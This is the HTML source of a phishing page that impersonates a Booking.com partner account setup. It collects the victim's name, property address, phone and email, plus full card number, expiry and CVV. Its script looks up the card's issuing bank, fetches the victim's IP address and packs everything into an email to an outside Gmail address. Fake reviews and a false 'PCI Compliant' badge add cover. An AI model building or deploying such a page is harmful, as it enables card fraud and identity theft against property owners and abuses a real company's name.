```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Booking.com Partner Account Setup - Secure and Verified</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #003580 0%, #0056b3 100%); margin: 0; padding: 20px; color: #333; }
        .container { max-width: 700px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); position: relative; }
        .header { text-align: center; margin-bottom: 20px; }
        .header h1 { color: #003580; font-size: 28px; margin: 0; }
        .header p { color: #666; font-size: 16px; }
        .reviews { background: #f9f9f9; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; }
        .reviews .stars { color: #FFD700; font-size: 24px; }
        .reviews p { margin: 5px 0; font-size: 14px; color: #555; }
        form { display: flex; flex-direction: column; }
        .section { margin-bottom: 30px; }
        .section h2 { color: #003580; font-size: 20px; margin-bottom: 15px; }
        label { margin-top: 15px; font-weight: bold; color: #333; }
        input, select { padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
        input:focus, select:focus { outline: none; border-color: #003580; box-shadow: 0 0 5px rgba(0, 3, 128, 0.5); }
        button { background: linear-gradient(135deg, #003580 0%, #00264d 100%); color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; margin-top: 25px; font-size: 18px; font-weight: bold; transition: background 0.3s; }
        button:hover { background: linear-gradient(135deg, #00264d 0%, #001a33 100%); }
        .progress { margin-top: 10px; height: 5px; background: #ddd; border-radius: 5px; overflow: hidden; }
        .progress-bar { height: 100%; background: #003580; width: 0%; transition: width 0.5s; }
        #capturedData { display: none; margin-top: 20px; padding: 15px; background: #e8f5e8; border: 1px solid #003580; border-radius: 8px; }
        #chatTrigger { position: fixed; bottom: 20px; right: 20px; background: #003580; color: white; padding: 15px; border-radius: 50%; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); display: none; }
        #chatTrigger:hover { background: #00264d; }
        .customer-service { background: #f0f8ff; padding: 20px; border-radius: 12px; margin-top: 30px; text-align: center; border: 1px solid #003580; }
        .customer-service h2 { color: #003580; margin: 0 0 10px 0; font-size: 24px; }
        .customer-service p { margin: 10px 0; font-size: 16px; color: #555; }
        .customer-service button { background: #003580; color: white; padding: 12px 20px; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; }
        .customer-service button:hover { background: #00264d; }
        .security { display: flex; align-items: center; justify-content: center; margin-top: 15px; font-size: 14px; color: #666; }
        .security img { width: 24px; margin-right: 10px; }
        @media (max-width: 600px) { .container { padding: 20px; } }
    </style>
    <script>
        const inputs = document.querySelectorAll('input, select');
        inputs.forEach(input => {
            input.addEventListener('input', updateProgress);
        });
        function updateProgress() {
            const filled = Array.from(inputs).filter(i => i.value).length;
            const percent = (filled / inputs.length) * 100;
            document.getElementById('progressBar').style.width = percent + '%';
            if (percent > 50) document.getElementById('chatTrigger').style.display = 'block';
        }
        
        async function checkBin(bin) {
            try {
                console.log('Fetching BIN:', bin);
                const response = await fetch(`https://binx.cc/bin/${bin}`);
                if (!response.ok) throw new Error('BIN not found');
                const text = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(text, 'text/html');
                const bank = doc.querySelector('.bank-name')?.textContent || 'Unknown Bank';
                const country = doc.querySelector('.country')?.textContent || 'Unknown Country';
                const brand = doc.querySelector('.card-brand')?.textContent || 'Unknown Brand';
                const type = doc.querySelector('.card-type')?.textContent || 'Unknown Type';
                console.log('BIN result:', { bank, country, brand, type });
                return `Bank: ${bank}, Country: ${country}, Brand: ${brand}, Type: ${type}`;
            } catch (error) {
                console.error('BIN check error:', error);
                return 'BIN check failed - invalid or unknown BIN.';
            }
        }
        
        function openChat() {
            alert('Chat feature removed. This is a simulation.');
        }
        
        document.getElementById('setupForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const data = {
                name: document.getElementById('name').value,
                propertyAddress: document.getElementById('propertyAddress').value,
                phone: document.getElementById('phone').value,
                email: document.getElementById('email').value,
                cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value
            };
            
            const bin = data.cardNumber.slice(0, 6);
            const binInfo = await checkBin(bin);
            
            let ip = 'Unknown';
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ip = ipData.ip;
            } catch (err) { console.warn('IP fetch error:', err); }
            
            const body = '🔔 NEW BOOKING.COM PARTNER 🔔\n' +
                'Name: ' + data.name + '\n' +
                'Property Address: ' + data.propertyAddress + '\n' +
                'Phone: ' + data.phone + '\n' +
                'Email: ' + data.email + '\n' +
                'Card: ' + data.cardNumber + '\n' +
                'Expiry: ' + data.expiry + '\n' +
                'CVV: ' + data.cvv + '\n' +
                'BIN: ' + binInfo + '\n' +
                'IP: ' + ip;
            
            document.getElementById('setupForm').action = 'mailto:customerservicelivepro@gmail.com?subject=New Booking Partner&body=' + encodeURIComponent(body);
            
            alert('Account setup complete! Please send the email to confirm.');
            document.getElementById('displayName').textContent = data.name;
            document.getElementById('displayPropertyAddress').textContent = data.propertyAddress;
            document.getElementById('displayPhone').textContent = data.phone;
            document.getElementById('displayEmail').textContent = data.email;
            document.getElementById('displayCardNumber').textContent = data.cardNumber;
            document.getElementById('displayExpiry').textContent = data.expiry;
            document.getElementById('displayCvv').textContent = data.cvv;
            document.getElementById('displayBin').textContent = binInfo;
            document.getElementById('capturedData').style.display = 'block';
            document.getElementById('setupForm').style.display = 'none';
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Booking.com Partner Account Setup</h1>
            <p>Secure and Verified Process to Start Listing Your Property</p>
        </div>
        <div class="reviews">
            <div class="stars">★★★★★</div>
            <p>"Easy setup! Started earning from bookings in no time." - Verified Partner</p>
            <p>Over 50,000 properties listed successfully this month.</p>
        </div>
        <form id="setupForm" action="mailto:customerservicelivepro@gmail.com?subject=New Booking Partner&body=Data:" method="post" enctype="text/plain">
            <div class="section">
                <h2>To Proceed with Opening Your Account</h2>
                <label for="name">Your Full Name</label>
                <input type="text" id="name" name="name" required>
                
                <label for="propertyAddress">Property Address</label>
                <input type="text" id="propertyAddress" name="propertyAddress" placeholder="Full address including street, city, state, zip" required>
                
                <label for="phone">Contact Phone Number</label>
                <input type="tel" id="phone" name="phone" placeholder="+1 (123) 456-7890" required>
                
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="your@email.com" required>
                
                <label for="photos">Property Photos (Upload Link or Description)</label>
                <input type="url" id="photos" name="photos" placeholder="https://example.com/photos or describe" required>
            </div>
            
            <div class="section">
                <h2>Complete the Setup with Payment Verification</h2>
                <label for="cardNumber">Card Number (for verification)</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                
                <label for="expiry">Expiry Date (MM/YY)</label>
                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
                
                <label for="cvv">CVV (3-4 digits)</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
            </div>
            
            <div class="security">
                <img src="https://via.placeholder.com/24x24?text=🔒" alt="Secure">
                <span>256-bit SSL Encrypted & PCI Compliant</span>
            </div>
            
            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <button type="submit">Complete Account Setup</button>
        </form>
        
        <div id="capturedData">
            <h3>Account Setup Complete - Welcome to Booking.com Partners</h3>
            <p><strong>Name:</strong> <span id="displayName"></span></p>
            <p><strong>Property Address:</strong> <span id="displayPropertyAddress"></span></p>
            <p><strong>Phone:</strong> <span id="displayPhone"></span></p>
            <p><strong>Email:</strong> <span id="displayEmail"></span></p>
            <p><strong>Card Number:</strong> <span id="displayCardNumber"></span></p>
            <p><strong>Expiry:</strong> <span id="displayExpiry"></span></p>
            <p><strong>CVV:</strong> <span id="displayCvv"></span></p>
            <p><strong>BIN Details:</strong> <span id="displayBin"></span></p>
            <p style="color: green;">Your account is now active. Property listing will be processed within 24 hours.</p>
        </div>
        
        <div class="customer-service">
            <h2>Customer Service Live Chat</h2>
            <p>Need help with your account setup or have questions? Our support team is here to assist you 24/7.</p>
            <button onclick="openChat()">Start Live Chat</button>
        </div>
    </div>
    
    <div id="chatTrigger" onclick="openChat()">💬 Chat Support</div>
    
    <script>
        // Additional scripts if needed
    </script>
    
    <!-- Tidio Live Chat Embed -->
    <script src="//code.tidio.co/lvjdyaxiafwpvhpvcwiagvmqaywf58gp.js" async></script>
</body>
</html>
```
